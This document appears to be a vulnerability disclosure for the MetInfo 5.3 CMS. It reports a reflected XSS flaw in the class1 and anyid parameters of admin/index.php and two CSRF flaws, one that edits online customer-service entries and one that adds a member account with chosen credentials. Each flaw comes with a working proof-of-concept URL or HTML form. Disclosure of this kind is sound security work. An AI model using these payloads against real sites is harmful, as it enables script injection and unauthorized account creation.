# XSS

MetInfo5.3 application is vulnerable to Cross-Site scripting (XSS) vulnerabilities. Attackers can inject arbitrary web script or HTML via the class1 parameter or the anyid parameter to admin/index.php.

Vulnerability parameter：&class1、&anyid

Poc:
```
http://127.0.0.1/MetInfo5.3/admin/index.php?n=content&c=article_admin&a=doindex&class1=2"><script>alert(111)</script>&lang=cn&anyid=29"><script>alert(111)<%2fscript>
```
![](http://i.imgur.com/8IWwsyG.png)

#CSRF-1

MetInfo5.3 application is vulnerable to Cross-Site Request Forgery (CSRF) vulnerability. A successful CSRF attack can force the administrator to add an malicious online customer service.

Poc：
```
<html>
  <body>
    <form action="http://127.0.0.1/MetInfo5.3/admin/interface/online/delete.php?anyid=71&lang=cn&class1=" method="POST">
      <input type="hidden" name="allid" value="6&#44;" />
      <input type="hidden" name="action" value="editor" />
      <input type="hidden" name="id" value="6" />
      <input type="hidden" name="no&#95;order&#95;6" value="1" />
      <input type="hidden" name="name&#95;6" value="mm" />
      <input type="hidden" name="qq&#95;6" value="123123" />
      <input type="hidden" name="msn&#95;6" value="" />
      <input type="hidden" name="taobao&#95;6" value="mm123" />
      <input type="hidden" name="alibaba&#95;6" value="mm123" />
      <input type="hidden" name="skype&#95;6" value="" />
      <input type="hidden" name="saveorder" value="ä&#191;&#157;å&#173;&#152;" />
      <input type="hidden" name="action&#95;type" value="del" />
      <input type="hidden" name="allid" value="6&#44;" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

Before the attack：
![](http://i.imgur.com/l1hG2ta.png)
After the attack:
![](http://i.imgur.com/744zMBp.png)
Display on the home page:
![](http://i.imgur.com/bbW2wG1.png)

#CSRF-2

MetInfo5.3 application is vulnerable to Cross-Site Request Forgery (CSRF) vulnerability. A successful CSRF attack can force the administrator to add a member with specialized username and password.

Poc:
```
<html>
  <body>
    <form action="http://127.0.0.1/MetInfo5.3/admin/index.php?lang=cn&anyid=73&n=user&c=admin_user&a=doaddsave" method="POST">
      <input type="hidden" name="username" value="www" />
      <input type="hidden" name="password" value="123456" />
      <input type="hidden" name="groupid" value="1" />
      <input type="hidden" name="valid" value="1" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```
Before the attack:
![](http://i.imgur.com/xT1KItW.png)
After the attack:
![](http://i.imgur.com/XzQebmO.png)

